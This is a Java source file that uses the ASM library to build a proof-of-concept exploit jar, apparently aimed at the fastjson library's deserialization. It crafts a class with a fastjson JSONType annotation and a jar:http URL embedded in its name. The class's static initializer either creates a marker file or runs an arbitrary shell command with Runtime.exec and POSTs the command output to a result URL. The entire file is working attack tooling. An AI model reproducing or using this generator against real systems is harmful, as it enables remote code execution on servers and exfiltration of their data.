import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * Generate a probe jar whose bytecode internal name embeds the jar:http URL used by the PoC.
 */
public final class CraftProbe {
    private CraftProbe() {
    }

    public static String internalName(String hostToken, int port, String entry) {
        return internalName("jar", hostToken, port, "probe", entry);
    }

    public static String typeName(String hostToken, int port, String entry) {
        return typeName("jar", hostToken, port, "probe", entry);
    }

    public static byte[] craftClass(String internalName, String pwnedFile) {
        return craftClass(internalName, pwnedFile, true, false);
    }

    public static String internalName(String protocol, String hostToken, int port, String resource, String entry) {
        if ("jar".equals(protocol)) {
            return "jar:http://" + hostToken + ":" + port + "/" + resource + "!/" + entry;
        }
        if ("http".equals(protocol)) {
            return "http://" + hostToken + ":" + port + "/" + resource + "/" + entry;
        }
        throw new IllegalArgumentException("unsupported protocol: " + protocol);
    }

    public static String typeName(String protocol, String hostToken, int port, String resource, String entry) {
        String dottedResource = resource.replace('/', '.');
        if ("jar".equals(protocol)) {
            return "jar:http:.." + hostToken + ":" + port + "." + dottedResource + "!." + entry;
        }
        if ("http".equals(protocol)) {
            return "http:.." + hostToken + ":" + port + "." + dottedResource + "." + entry;
        }
        throw new IllegalArgumentException("unsupported protocol: " + protocol);
    }

    public static byte[] craftClass(String internalName, String pwnedFile, boolean jsonType, boolean autoCloseable) {
        return craftClass(internalName, pwnedFile, jsonType, autoCloseable, null, null);
    }

    public static byte[] craftClass(
            String internalName,
            String pwnedFile,
            boolean jsonType,
            boolean autoCloseable,
            String command,
            String resultUrl) {
        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);
        String[] interfaces = autoCloseable ? new String[] {"java/lang/AutoCloseable"} : null;
        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", interfaces);

        if (jsonType) {
            AnnotationVisitor annotation = writer.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
            annotation.visitEnd();
        }

        MethodVisitor method = writer.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        method.visitCode();
        method.visitVarInsn(Opcodes.ALOAD, 0);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(1, 1);
        method.visitEnd();

        if (autoCloseable) {
            method = writer.visitMethod(Opcodes.ACC_PUBLIC, "close", "()V", null, null);
            method.visitCode();
            method.visitInsn(Opcodes.RETURN);
            method.visitMaxs(0, 1);
            method.visitEnd();
        }

        method = writer.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        method.visitCode();
        method.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        method.visitLdcInsn("REMOTE POC <clinit> EXECUTED (class defined from jar:http URL)");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        if (command != null && resultUrl != null) {
            emitCommand(method, command, resultUrl);
        } else {
            method.visitTypeInsn(Opcodes.NEW, "java/io/File");
            method.visitInsn(Opcodes.DUP);
            method.visitLdcInsn(pwnedFile);
            method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
            method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/File", "createNewFile", "()Z", false);
            method.visitInsn(Opcodes.POP);
        }
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(0, 0);
        method.visitEnd();

        writer.visitEnd();
        return writer.toByteArray();
    }

    private static void emitCommand(MethodVisitor method, String command, String resultUrl) {
        method.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        method.visitLdcInsn(command);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        method.visitVarInsn(Opcodes.ASTORE, 0);

        method.visitTypeInsn(Opcodes.NEW, "java/util/Scanner");
        method.visitInsn(Opcodes.DUP);
        method.visitVarInsn(Opcodes.ALOAD, 0);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
        method.visitLdcInsn("UTF-8");
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/util/Scanner", "<init>", "(Ljava/io/InputStream;Ljava/lang/String;)V", false);
        method.visitLdcInsn("\\A");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/Scanner", "useDelimiter", "(Ljava/lang/String;)Ljava/util/Scanner;", false);
        method.visitVarInsn(Opcodes.ASTORE, 1);

        Label emptyOutput = new Label();
        Label outputReady = new Label();
        method.visitVarInsn(Opcodes.ALOAD, 1);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/Scanner", "hasNext", "()Z", false);
        method.visitJumpInsn(Opcodes.IFEQ, emptyOutput);
        method.visitVarInsn(Opcodes.ALOAD, 1);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/Scanner", "next", "()Ljava/lang/String;", false);
        method.visitVarInsn(Opcodes.ASTORE, 2);
        method.visitJumpInsn(Opcodes.GOTO, outputReady);
        method.visitLabel(emptyOutput);
        method.visitLdcInsn("");
        method.visitVarInsn(Opcodes.ASTORE, 2);
        method.visitLabel(outputReady);
        method.visitVarInsn(Opcodes.ALOAD, 1);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/Scanner", "close", "()V", false);

        method.visitTypeInsn(Opcodes.NEW, "java/net/URL");
        method.visitInsn(Opcodes.DUP);
        method.visitLdcInsn(resultUrl);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/URL", "openConnection", "()Ljava/net/URLConnection;", false);
        method.visitTypeInsn(Opcodes.CHECKCAST, "java/net/HttpURLConnection");
        method.visitVarInsn(Opcodes.ASTORE, 3);
        method.visitVarInsn(Opcodes.ALOAD, 3);
        method.visitInsn(Opcodes.ICONST_1);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/HttpURLConnection", "setDoOutput", "(Z)V", false);
        method.visitVarInsn(Opcodes.ALOAD, 3);
        method.visitLdcInsn("POST");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestMethod", "(Ljava/lang/String;)V", false);
        method.visitVarInsn(Opcodes.ALOAD, 3);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/HttpURLConnection", "getOutputStream", "()Ljava/io/OutputStream;", false);
        method.visitVarInsn(Opcodes.ASTORE, 4);
        method.visitVarInsn(Opcodes.ALOAD, 4);
        method.visitVarInsn(Opcodes.ALOAD, 2);
        method.visitLdcInsn("UTF-8");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "getBytes", "(Ljava/lang/String;)[B", false);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/OutputStream", "write", "([B)V", false);
        method.visitVarInsn(Opcodes.ALOAD, 4);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/OutputStream", "close", "()V", false);
        method.visitVarInsn(Opcodes.ALOAD, 3);
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/HttpURLConnection", "getResponseCode", "()I", false);
        method.visitInsn(Opcodes.POP);
    }

    public static byte[] writeProbeJar(File jarFile, String hostToken, int port, String entry, String pwnedFile) throws Exception {
        return writeProbeJar(jarFile, "jar", hostToken, port, "probe", entry, pwnedFile, true, false);
    }

    public static byte[] writeProbeJar(
            File jarFile,
            String protocol,
            String hostToken,
            int port,
            String resource,
            String entry,
            String pwnedFile,
            boolean jsonType,
            boolean autoCloseable) throws Exception {
        return writeProbeJar(
                jarFile, protocol, hostToken, port, resource, entry, pwnedFile, jsonType, autoCloseable, null, null);
    }

    public static byte[] writeProbeJar(
            File jarFile,
            String protocol,
            String hostToken,
            int port,
            String resource,
            String entry,
            String pwnedFile,
            boolean jsonType,
            boolean autoCloseable,
            String command,
            String resultUrl) throws Exception {
        String internal = internalName(protocol, hostToken, port, resource, entry);
        byte[] classBytes = craftClass(internal, pwnedFile, jsonType, autoCloseable, command, resultUrl);
        File parent = jarFile.getAbsoluteFile().getParentFile();
        if (parent != null) {
            parent.mkdirs();
        }
        JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarFile));
        try {
            jos.putNextEntry(new JarEntry("POC.class"));
            jos.write(classBytes);
            jos.closeEntry();
        } finally {
            jos.close();
        }
        return Files.readAllBytes(jarFile.toPath());
    }
}
